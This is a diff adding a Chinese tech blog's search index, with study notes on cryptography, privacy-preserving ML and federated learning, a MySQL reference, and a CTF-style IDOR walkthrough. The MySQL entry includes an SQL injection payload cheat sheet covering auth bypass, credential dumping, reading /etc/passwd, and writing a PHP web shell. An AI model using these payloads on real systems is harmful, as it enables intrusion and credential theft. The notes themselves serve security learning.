@@ -1,0 +1,309 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>论文阅读笔记</title>
+      <link href="/2024/04/21/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
+      <url>/2024/04/21/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>秘密分享</title>
+      <link href="/2023/11/29/%E7%A7%98%E5%AF%86%E5%88%86%E4%BA%AB/"/>
+      <url>/2023/11/29/%E7%A7%98%E5%AF%86%E5%88%86%E4%BA%AB/</url>
+      
+        <content type="html"><![CDATA[<h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h2><p>秘密分享，即<strong>需要传输的隐私数据被分割成n份，参与方分别拥有一份，这些参与方一般是对等的角色</strong>，且其中的分享或者说分割和还原均不涉及加解密，只有多于特定t个参与者合作才可以计算出或是恢复秘密，而少于t个参与者则不可以得到有关秘密。<strong>秘密分享的优势正在于此，数据的分裂和还原运算一般来说成本极低</strong>，如加性秘密分享(Additive Secret Sharing)，分裂和还原只是加减法，除此之外，就是对分裂点的选择需要做一次随机数生成，这些运算成本远低于一般的加解密运算。更为重要的是，<strong>秘密分享真正价值在于处于分裂态可以运算，而运算的结果在多方参与的情况下可以还原</strong>。</p><p><img src="/images/image-20231129144346572.png" alt="image-20231129144346572"></p><h2 id="2-Shamir密钥分享算法"><a href="#2-Shamir密钥分享算法" class="headerlink" title="2. Shamir密钥分享算法"></a>2. Shamir密钥分享算法</h2><p>​    其基本思想是分发者通过多项式，将一个密文C分成 N份共享单元，使得其中的任意 t 份共享单元可以组合重构出C ，但是其中任何的 t−1 份共享单元都无法得到关于C 的信息。</p><p><strong>依赖的数学基础：</strong></p><p><img src="/images/image-20231129145006800.png" alt="image-20231129145006800"></p><p><strong>算法原理：</strong></p><p><img src="/images/image-20231129145204215.png" alt="image-20231129145204215"></p><p><strong>基于异或运算的秘密分享</strong>：</p><p><img src="/images/image-20231129145334373.png" alt="image-20231129145334373"></p><p> <strong>加法重构：多方计算 M+N</strong></p><p><img src="/images/image-20231129151153640.png" alt="image-20231129151153640"></p><p><strong>乘法重构：多方计算 M*N</strong></p><p><img src="/images/image-20231129151246994.png" alt="image-20231129151246994"></p><p>【参考】</p><p><a href="https://zhuanlan.zhihu.com/p/393014638">多方安全计算之秘密分享 - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/425373408">应用密码学 | 秘密共享的概念与算法详解 - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/440667227">Shamir秘密共享协议 - 知乎 (zhihu.com)</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 隐私保护技术 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>全同态加密</title>
+      <link href="/2023/07/23/%E5%85%A8%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/"/>
+      <url>/2023/07/23/%E5%85%A8%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/</url>
+      
+        <content type="html"><![CDATA[<h2 id="1-同态加密"><a href="#1-同态加密" class="headerlink" title="1. 同态加密"></a>1. 同态加密</h2><p>内容参考于<a href="https://mp.weixin.qq.com/s/pOtCtwphPnKesef3iaLpCQ">https://mp.weixin.qq.com/s/pOtCtwphPnKesef3iaLpCQ</a></p><p>同态加密是<strong>允许在加密后的密文上进行运算</strong>，且<strong>解密后和直接在原始数据上运算结果相同</strong>。</p><h3 id="1-1-部分同态加密"><a href="#1-1-部分同态加密" class="headerlink" title="1.1 部分同态加密"></a>1.1 部分同态加密</h3><p>主要是为<strong>乘法同态（RSA加密）</strong>和<strong>加法同态（Paillier加密）</strong></p><p>注意：加法同态是密文上的乘=明文上的加</p><p><img src="/images/image-20230723134242350.png" alt="image-20230723134242350"></p><p><img src="/images/image-20230723134330157.png" alt="image-20230723134330157"></p><h3 id="1-2-全同态加密"><a href="#1-2-全同态加密" class="headerlink" title="1.2 全同态加密"></a>1.2 全同态加密</h3><p>全同态加密可以在密文上进行加法和乘法的操作。</p><p><strong>容错学习（LWE，Learning With Error）问题</strong>：给定一个<strong>秘密的向量s</strong>，以及一个<strong>随机选取的向量a</strong>，还有一个<strong>符合某种分布的一个错误e</strong>，或者把它叫做噪声。将这一个<strong>随机选取的向量和秘密向量进行一个内积</strong>，再<strong>将噪声加上</strong>，将这两项发送给另一方，另一方是无法通过a和b来计算得出s的。</p><p>RLWE问题就是将LWE问题迁移到了环上，Rq是一个整数的多项式，除掉一个分源多项式，在系数上模掉一个模数q。</p><p>BGV，BFV和CKKS三种加密算法都是基于RLWE的加密方案，区别在于前两者的明文空间都在中Rt，<strong>CKKS的明文空间是R，不受该限制</strong>。另外主要的区别就在于<strong>BGV，BFV是在一个有限域内的精确运算</strong>。然后<strong>CKKS是一个浮点数上或者说复数空间上的一个近似的运算</strong>，因为它会把最后的噪声也当作明文的一部分输出出来。</p><p><img src="/images/image-20230723134523621.png" alt="image-20230723134523621"></p><h4 id="1-3-1-CKKS全同态加密"><a href="#1-3-1-CKKS全同态加密" class="headerlink" title="1.3.1 CKKS全同态加密"></a>1.3.1 CKKS全同态加密</h4><p><img src="/images/image-20230723142236003.png" alt="image-20230723142236003"></p><p>CKKS算法中，假设两边的明文是0.3和0.5，各放大10倍，通过运算，得到8，不过引入了噪声，也就是最后的0.223/10，这是无法删除的。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/WHkicXuQh78vwno95XFRR3lW5icqrjadV0r6WJudr7l9G8H0bHcH7I60M38tWicU82ibvfhiaIuk5QoVq4JRBBn0OBw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="2-应用场景"><a href="#2-应用场景" class="headerlink" title="2. 应用场景"></a>2. 应用场景</h2><p><img src="/images/image-20230814104615631.png" alt="image-20230814104615631"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 隐私保护技术 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Split-learning</title>
+      <link href="/2023/05/15/Split-learning/"/>
+      <url>/2023/05/15/Split-learning/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Split-Learning（分裂学习）"><a href="#Split-Learning（分裂学习）" class="headerlink" title="Split Learning（分裂学习）"></a>Split Learning（分裂学习）</h1><p>Split Learning被提出的场景是：多个常规算力节点(Alices)+一个超级算力节点(Bob)。核心思想是各方在不泄露原始数据的情况下，共同训练一个完整的模型，同时将模型中计算负载较高的部分安排在Bob节点。</p><h4 id="1-经典架构"><a href="#1-经典架构" class="headerlink" title="1.经典架构"></a>1.经典架构</h4><h5 id="普通型"><a href="#普通型" class="headerlink" title="普通型"></a>普通型</h5><p><img src="/images/image-20230516165706838.png" alt="image-20230516165706838"></p><p><img src="/images/image-20230516165845635.png" alt="image-20230516165845635"></p><p>普通型架构中只有一个Client节点(Alice)和一个Server节点(Bob)。Client根据其原始数据前向计算半模型得到cut layer（绿色框条）的前向值，Client随后将此值发送至Server侧，Server接收后完成剩余的前向计算；Server根据前向结果与label计算Server节点半模型的梯度，然后通过Server的cut layer把梯度反传给Client节点，最后Client完成它的半模型的BP梯度计算。<strong>注意：Server节点的label有可能是Client节点share给它的。</strong></p><p>内容参考于<a href="https://zhuanlan.zhihu.com/p/541880009">https://zhuanlan.zhihu.com/p/541880009</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 隐私保护技术 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>分类模型处理</title>
+      <link href="/2023/05/14/%E5%88%86%E7%B1%BB%E6%A8%A1%E5%9E%8B%E5%A4%84%E7%90%86/"/>
+      <url>/2023/05/14/%E5%88%86%E7%B1%BB%E6%A8%A1%E5%9E%8B%E5%A4%84%E7%90%86/</url>
+      
+        <content type="html"><![CDATA[<h2 id="1-相关矩阵（Correlation-Matrix）"><a href="#1-相关矩阵（Correlation-Matrix）" class="headerlink" title="1.相关矩阵（Correlation Matrix）"></a>1.相关矩阵（Correlation Matrix）</h2><p>删除相关变量以改进模型是必要的。可以使用pandas“.corr（）”函数找到相关性，并可以使用plotly express可视化相关性矩阵。相关代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import plotly.express as px</span><br><span class="line">px.imshow(df.corr(),title=&quot;Correlation Plot of the Heat Failure Prediction&quot;)</span><br></pre></td></tr></table></figure><h4 id="数据分析相关代码："><a href="#数据分析相关代码：" class="headerlink" title="数据分析相关代码："></a>数据分析相关代码：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import seaborn as sns</span><br><span class="line">sns.pairplot(df,hue=&quot;HeartDisease&quot;)</span><br></pre></td></tr></table></figure><p>这段代码使用Seaborn库中的pairplot函数，用于绘制数据集中各个变量之间的散点图和直方图，并且根据“HeartDisease”变量的不同取值对数据进行分组，以不同颜色来表示。</p><p>具体来说，df是一个数据框，包含多个变量（列），pairplot函数会对每两个变量之间进行散点图和直方图的绘制。hue参数指定了用于分组的变量名，即“HeartDisease”，如果数据集中有该变量，则会根据该变量的取值来对数据进行分组，以不同颜色来表示。如果数据集中没有该变量，则会忽略该参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import seaborn as sns</span><br><span class="line">sns.histplot(df[col],kde=True)</span><br></pre></td></tr></table></figure><p>这行代码使用 Seaborn 库中的 histplot 函数，绘制数据框 df 中指定列 col 的直方图。kde=True 表示同时绘制核密度估计曲线。核密度估计是一种通过对数据进行平滑处理来估计概率密度函数的方法，可以更好地展示数据的分布情况。</p><h2 id="2-特征缩放（Feature-Scaling）"><a href="#2-特征缩放（Feature-Scaling）" class="headerlink" title="2.特征缩放（Feature Scaling）"></a>2.特征缩放（Feature Scaling）</h2><p>特征缩放是指对数据集中的特征进行缩放，使得所有特征都处于相同的尺度范围内，以便更好地应用于机器学习算法中。在进行特征缩放之前，不同的特征可能具有不同的尺度，例如某些特征可能是小数，而另一些特征可能是整数或非常大的数字。这会导致模型在学习时对不同特征的权重分配不均，从而影响模型的性能。</p><p>常见的特征缩放方法包括：</p><ol><li><p>标准化（Standardization）：将特征缩放到均值为0，方差为1的标准正态分布中，使得特征的取值范围在[-3,3]之间。</p></li><li><p>归一化（Normalization）：将特征缩放到[0,1]之间，使得特征的取值范围在[0,1]之间。</p></li><li><p>对数变换（Log transformation）：对特征进行对数变换，使得特征的取值范围更加均匀分布。</p></li></ol><p>通过特征缩放，可以提高模型的性能，使得模型更加准确地预测结果。</p><h4 id="如何选择标准化还是归一化？"><a href="#如何选择标准化还是归一化？" class="headerlink" title="如何选择标准化还是归一化？"></a>如何选择标准化还是归一化？</h4><ul><li><p>当知道数据的分布不遵循高斯分布时，可以使用归一化。这在不假设任何数据分布的算法（如K-最近邻和神经网络）中是有用的。</p></li><li><p>另一方面，在数据遵循高斯分布的情况下，标准化可能会有所帮助。然而，这并不一定是真的。此外，与标准化不同，标准化没有边界范围。因此，即使您的数据中有异常值，它们也不会受到标准化的影响。</p></li></ul><h2 id="3-文本特征编码"><a href="#3-文本特征编码" class="headerlink" title="3.文本特征编码"></a>3.文本特征编码</h2><h4 id="1-Label-Encoding——-For-Tree-based-Machine-Learning-Algorithms"><a href="#1-Label-Encoding——-For-Tree-based-Machine-Learning-Algorithms" class="headerlink" title="1.Label Encoding——-For Tree based Machine Learning Algorithms"></a>1.Label Encoding——-For Tree based Machine Learning Algorithms</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.preprocessing import LabelEncoder</span><br><span class="line">df_tree = df.apply(LabelEncoder().fit_transform)</span><br></pre></td></tr></table></figure><p>这行代码的作用是将 DataFrame（df）中的所有列进行标签编码（Label Encoding）处理，并返回一个新的 DataFrame（df_tree）。</p><p>具体来说，<code>LabelEncoder()</code> 是一个类，它将字符串标签转换为数字编码。<code>.fit_transform()</code> 方法将 DataFrame 中的每一列都进行标签编码，并返回一个新的 DataFrame。因为这里使用了 <code>.apply()</code> 方法，所以每一列都会被依次处理。</p><p>标签编码是将不连续的数字或文本转换为连续的数字编码的过程。例如，如果一个列中有三个不同的字符串标签：“red”、“green”和“blue”，则标签编码后会分别转换为 0、1 和 2。这种编码方式通常用于将分类数据转换为数值数据，以便在机器学习算法中使用。</p><h4 id="2-One-Hot-Encoding—–For-not-Tree-based-Machine-Learning-Algorithms"><a href="#2-One-Hot-Encoding—–For-not-Tree-based-Machine-Learning-Algorithms" class="headerlink" title="2.One Hot Encoding—–For not Tree based Machine Learning Algorithms"></a>2.One Hot Encoding—–For not Tree based Machine Learning Algorithms</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#pd.get_dummies()</span><br><span class="line">df_nontree=pd.get_dummies(df,columns=string_col,drop_first=False)</span><br></pre></td></tr></table></figure><p>这段代码使用pandas中的get_dummies()函数，将数据框df中的string_col列进行one-hot编码，并将编码结果添加到新的数据框df_nontree中。其中，drop_first参数为False表示不删除第一类别，即生成所有类别的编码列。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 机器学习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>密码学基础</title>
+      <link href="/2023/02/14/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/"/>
+      <url>/2023/02/14/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="1-密码学基础"><a href="#1-密码学基础" class="headerlink" title="1.密码学基础"></a>1.密码学基础</h1><h2 id="1-1-密码"><a href="#1-1-密码" class="headerlink" title="1.1 密码"></a>1.1 密码</h2><p>根据密钥的使用方法，可以将密码分为<strong>对称密码</strong>与<strong>公钥密钥</strong>（也称为非对称密码）两种。使用密码是为了<strong>保证消息的机密性</strong>。</p><p><strong>对称密码</strong>是指在加密与解密过程中使用<strong>同一密钥</strong>的方式。</p><p><strong>公钥密码</strong>是指在加密和解密时使用<strong>不同的密钥</strong>的方式。</p><p><strong>混合密码系统</strong>是将对称密码和公钥密码结合起来的密码方式。</p><p><img src="/images/image-20230215203720617.png" alt="image-20230215203720617"></p><h2 id="1-2-其他密码技术"><a href="#1-2-其他密码技术" class="headerlink" title="1.2 其他密码技术"></a>1.2 其他密码技术</h2><ol><li><strong>单向散列函数</strong>是利用哈希函数来计算散列值，其保证了消息的<strong>完整性</strong>。完整性是指数据是正确的而不是伪造的，通过使用单向散列函数就可以检测数据是否被篡改过。</li><li><strong>消息验证码</strong>是一种可以<strong>保证完整性和提供认证</strong>的密码技术，其可以确认消息是否被篡改，同时也可以确认消息是否来自期待的通信对象。</li><li><strong>数字签名</strong>是一种能够确保<strong>完整性</strong>、<strong>提供认证</strong>并<strong>防止否认</strong>的密码技术。</li></ol><p><img src="/images/image-20230215203650669.png" alt="image-20230215203650669"></p><h2 id="1-3-对称密码"><a href="#1-3-对称密码" class="headerlink" title="1.3 对称密码"></a>1.3 对称密码</h2><p>对称密码是加密和解密使用相同密钥的方式，在计算机上的加密解密过程如下：</p><ol><li><p>对明文进行<strong>编码</strong>为<strong>比特序列</strong>，例如将字母根据ASCII编码映射为比特序列；</p></li><li><p>加密：明文编码后的比特序列与密钥进行<strong>XOR运算</strong>，得到密文，运算规则如下：</p><p><img src="/images/image-20230215211144946.png" alt="image-20230215211144946"></p></li><li><p>解密：密文再次与密钥进行XOR运算，得到明文。</p></li></ol><p><img src="/images/image-20230215211353094.png" alt="image-20230215211353094"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 密码学基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>联邦学习实战</title>
+      <link href="/2022/05/15/%E8%81%94%E9%82%A6%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/"/>
+      <url>/2022/05/15/%E8%81%94%E9%82%A6%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/</url>
+      
+        <content type="html"><![CDATA[<h1 id="1-联邦学习定义"><a href="#1-联邦学习定义" class="headerlink" title="1.联邦学习定义"></a>1.联邦学习定义</h1><p>​        联邦学习强调的核心理念是<strong>数据不动模型动，数据可用不可见</strong>，这就保证了数据在不出本地的前提下，各参与方之间协同训练模型。<strong>联邦学习是利用分散在各参与方的数据集，通过隐私保护技术融合多方数据信息，协同构建全局模型的一种分布式训练方式。</strong>在模型训练过程中，模型的相关信息（如模型的参数、模型结构、参数梯度等）能够在各参与方之间交换（交换的方式可以是明文、数据加密、添加噪声等），但是本地训练数据不会离开本地。</p><h2 id="1-1-联邦学习性能损失"><a href="#1-1-联邦学习性能损失" class="headerlink" title="1.1 联邦学习性能损失"></a>1.1 联邦学习性能损失</h2><p>​        联邦学习性能损失存在两种定义方式：一种狭义联邦学习性能损失；另一种是广义联邦学习性能损失。</p><p>​        <strong>狭义联邦学习性能损失</strong>：在分布式数据源上本地训练的性能<strong>近似于</strong>所有数据集中到一个地方进行训练的性能。</p><p>​        <strong>广义联邦学习性能损失</strong>：在分布式数据源上本地训练的性能<strong>存在比</strong>所有数据集中到一个地方进行训练的性能<strong>好的情况</strong>。例如多个参与方进行联邦训练时，如果部分客户端的数据质量都很差（比如客户端故障），那么将导致集中式训练结果会很差，但是联邦训练会在开始训练时对客户端进行检测，异常客户端将被剔除，所以联邦式训练性能自然要比集中式训练好。</p><h1 id="2-联邦学习分类"><a href="#2-联邦学习分类" class="headerlink" title="2.联邦学习分类"></a>2.联邦学习分类</h1><p>根据不同数据拥有者的数据特征空间与样本空间的重叠关系不同，联邦学习分为三种类型：横向联邦学习；纵向联邦学习；联邦迁移学习。根据如何协调数据参与者构建模型可以分为集中式拓扑架构和对等网络拓扑架构。</p><h2 id="2-1-横向联邦学习"><a href="#2-1-横向联邦学习" class="headerlink" title="2.1 横向联邦学习"></a>2.1 横向联邦学习</h2><p>​        横向联邦学习适用于联邦学习的<strong>参与方的数据特征有重叠，参与方拥有的数据样本（用户ID）不同</strong>。例如有两家不同地区的银行，他们可能存在很少的客户重叠，但是客户的数据可能因为相似的商业模式而由相似的特征。</p><p><img src="/image-20230215204345792.png" alt="image-20230215204344211"></p><h2 id="2-2-纵向联邦学习"><a href="#2-2-纵向联邦学习" class="headerlink" title="2.2 纵向联邦学习"></a>2.2 纵向联邦学习</h2><p>​        纵向联邦学习适用于联邦学习参与方训练数据<strong>有重叠的数据样本（用户ID），在特征上有所不同</strong>。</p><p><img src="/image-20230215204355538.png" alt="image-20230215204355538"></p><h2 id="2-3-联邦迁移学习"><a href="#2-3-联邦迁移学习" class="headerlink" title="2.3 联邦迁移学习"></a>2.3 联邦迁移学习</h2><p>​        联邦迁移学习适用于参与方的数据样本和数据特征都很少重叠的情况，以两个参与方为例，一方代表源域，另一方代表目标域，在源域中学习特征的分布，将源域的特征迁移到目标域中，但是迁移过程中，本地数据同样不会离开本地。</p><p><img src="/image-20230215204405923.png" alt="image-20230215204405923"></p><h2 id="2-4-协调方式分类"><a href="#2-4-协调方式分类" class="headerlink" title="2.4 协调方式分类"></a>2.4 协调方式分类</h2><p><strong>集中式拓扑：</strong>一般存在一个中心计算方（可以是独立于参与方的服务器，可以是某一个特定的参与方），该中心计算方承担收集其他各方传递的模型参数信息并经过相应算法更新后返回各方任务。</p><p><strong>对等网络拓扑：</strong>此种结构下，不存在中心计算节点，各参与方在联邦学习框架中的地位平等，离散式拓扑不用讨论中心计算方是否会泄露隐私或者遭受攻击，所以离散式拓扑更为安全，但是设计难度大。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 隐私保护技术 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MYSQL基础</title>
+      <link href="/2022/05/07/MYSQL%E5%9F%BA%E7%A1%80/"/>
+      <url>/2022/05/07/MYSQL%E5%9F%BA%E7%A1%80/</url>
+      
+        <content type="html"><![CDATA[<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><strong>General</strong></td><td></td></tr><tr><td><code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code></td><td>login to mysql database</td></tr><tr><td><code>SHOW DATABASES</code></td><td>List available databases</td></tr><tr><td><code>USE users</code></td><td>Switch to database</td></tr><tr><td><strong>Tables</strong></td><td></td></tr><tr><td><code>CREATE TABLE logins (id INT, ...)</code></td><td>Add a new table</td></tr><tr><td><code>SHOW TABLES</code></td><td>List available tables in current database</td></tr><tr><td><code>DESCRIBE logins</code></td><td>Show table properties and columns</td></tr><tr><td><code>INSERT INTO table_name VALUES (value_1,..)</code></td><td>Add values to table</td></tr><tr><td><code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code></td><td>Add values to specific columns in a table</td></tr><tr><td><code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code></td><td>Update table values</td></tr><tr><td><strong>Columns</strong></td><td></td></tr><tr><td><code>SELECT * FROM table_name</code></td><td>Show all columns in a table</td></tr><tr><td><code>SELECT column1, column2 FROM table_name</code></td><td>Show specific columns in a table</td></tr><tr><td><code>DROP TABLE logins</code></td><td>Delete a table</td></tr><tr><td><code>ALTER TABLE logins ADD newColumn INT</code></td><td>Add new column</td></tr><tr><td><code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></td><td>Rename column</td></tr><tr><td><code>ALTER TABLE logins MODIFY oldColumn DATE</code></td><td>Change column datatype</td></tr><tr><td><code>ALTER TABLE logins DROP oldColumn</code></td><td>Delete column</td></tr><tr><td><strong>Output</strong></td><td></td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1</code></td><td>Sort by column</td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1 DESC</code></td><td>Sort by column in descending order</td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></td><td>Sort by two-columns</td></tr><tr><td><code>SELECT * FROM logins LIMIT 2</code></td><td>Only show first two results</td></tr><tr><td><code>SELECT * FROM logins LIMIT 1, 2</code></td><td>Only show first two results starting from index 2</td></tr><tr><td><code>SELECT * FROM table_name WHERE &lt;condition&gt;</code></td><td>List results that meet a condition</td></tr><tr><td><code>SELECT * FROM logins WHERE username LIKE &#39;admin%&#39;</code></td><td>List results where the name is similar to a given string</td></tr></tbody></table><h2 id="MySQL-Operator-Precedence"><a href="#MySQL-Operator-Precedence" class="headerlink" title="MySQL Operator Precedence"></a>MySQL Operator Precedence</h2><ul><li>Division (<code>/</code>), Multiplication (<code>*</code>), and Modulus (<code>%</code>)</li><li>Addition (<code>+</code>) and Subtraction (<code>-</code>)</li><li>Comparison (<code>=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>, <code>LIKE</code>)</li><li>NOT (<code>!</code>)</li><li>AND (<code>&amp;&amp;</code>)</li><li>OR (<code>||</code>)</li></ul><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><table><thead><tr><th><strong>Payload</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><strong>Auth Bypass</strong></td><td></td></tr><tr><td><code>admin&#39; or &#39;1&#39;=&#39;1</code></td><td>Basic Auth Bypass</td></tr><tr><td><code>admin&#39;)-- -</code></td><td>Basic Auth Bypass With comments</td></tr><tr><td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">Auth Bypass Payloads</a></td><td></td></tr><tr><td><strong>Union Injection</strong></td><td></td></tr><tr><td><code>&#39; order by 1-- -</code></td><td>Detect number of columns using <code>order by</code></td></tr><tr><td><code>cn&#39; UNION select 1,2,3-- -</code></td><td>Detect number of columns using Union injection</td></tr><tr><td><code>cn&#39; UNION select 1,@@version,3,4-- -</code></td><td>Basic Union injection</td></tr><tr><td><code>UNION select username, 2, 3, 4 from passwords-- -</code></td><td>Union injection for 4 columns</td></tr><tr><td><strong>DB Enumeration</strong></td><td></td></tr><tr><td><code>SELECT @@version</code></td><td>Fingerprint MySQL with query output</td></tr><tr><td><code>SELECT SLEEP(5)</code></td><td>Fingerprint MySQL with no output</td></tr><tr><td><code>cn&#39; UNION select 1,database(),2,3-- -</code></td><td>Current database name</td></tr><tr><td><code>cn&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td><td>List all databases</td></tr><tr><td><code>cn&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;dev&#39;-- -</code></td><td>List all tables in a specific database</td></tr><tr><td><code>cn&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;credentials&#39;-- -</code></td><td>List all columns in a specific table</td></tr><tr><td><code>cn&#39; UNION select 1, username, password, 4 from dev.credentials-- -</code></td><td>Dump data from a table in another database</td></tr><tr><td><strong>Privileges</strong></td><td></td></tr><tr><td><code>cn&#39; UNION SELECT 1, user(), 3, 4-- -</code></td><td>Find current user</td></tr><tr><td><code>cn&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -</code></td><td>Find if user has admin privileges</td></tr><tr><td><code>cn&#39; UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=&quot;root&quot;-- -</code></td><td>Find if all user privileges</td></tr><tr><td><code>cn&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -</code></td><td>Find which directories can be accessed through MySQL</td></tr><tr><td><strong>File Injection</strong></td><td></td></tr><tr><td><code>cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -</code></td><td>Read local file</td></tr><tr><td><code>select &#39;file written successfully!&#39; into outfile &#39;/var/www/html/proof.txt&#39;</code></td><td>Write a string to a local file</td></tr><tr><td><code>cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -</code></td><td>Write a web shell into the base web directory</td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> mysql </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>逻辑漏洞</title>
+      <link href="/2021/12/06/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2021/12/06/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="逻辑越权"><a href="#逻辑越权" class="headerlink" title="逻辑越权"></a>逻辑越权</h2><p><strong>逻辑越权分为水平越权、垂直越权与未授权访问</strong></p><p><strong>水平越权：</strong>通过更换的某个 ID 之类的身份标识，从而使 A 账号获取（修改、删除等）B 账号数据。 </p><p><strong>垂直越权：</strong>使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。 </p><p><strong>未授权访问：</strong>通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作。</p><p><em><strong>如果在访问网站的数据包中有传输用户的编号、用户组编号或者类型编号的时候，那么尝试对这个值进行修改就是测试越权漏洞的基本。</strong></em></p><p><img src="/images/image-20211206213830709.png" alt="image-20211206213830709"></p><p><img src="/images/image-20211206214138091.png" alt="image-20211206214138091"></p><h3 id="墨者学院实战："><a href="#墨者学院实战：" class="headerlink" title="墨者学院实战："></a>墨者学院实战：</h3><p><img src="/images/image-20211206222039178.png" alt="image-20211206222039178"></p><p>登录后抓包，发现ID这种身份标识，</p><p><img src="/images/image-20211206222128936.png" alt="image-20211206222128936"></p><p>尝试更换成ID，结果返回他人信息</p><p><img src="/images/image-20211206222335605.png" alt="image-20211206222335605"></p><p>进行穷举爆破，得到所有人的信息</p><p><img src="/images/image-20211206222722603.png" alt="image-20211206222722603"></p><p>得到了所有人的ID，密码等信息，但是怎么知道题目要求的人物的账号ID呢，要找页面中有关人物的所有信息，查看网页源代码</p><p><img src="/images/image-20211206223040142.png" alt="image-20211206223040142"></p><p>发现人物的ID为20128880316，根据爆破得到的信息</p><p><img src="/images/image-20211206223207152.png" alt="image-20211206223207152"></p><p>密码经过MD5加密，解密得到密码，登录拿到flag。</p><h2 id="逻辑越权之登录脆弱"><a href="#逻辑越权之登录脆弱" class="headerlink" title="逻辑越权之登录脆弱"></a>逻辑越权之登录脆弱</h2><h3 id="登录脆弱"><a href="#登录脆弱" class="headerlink" 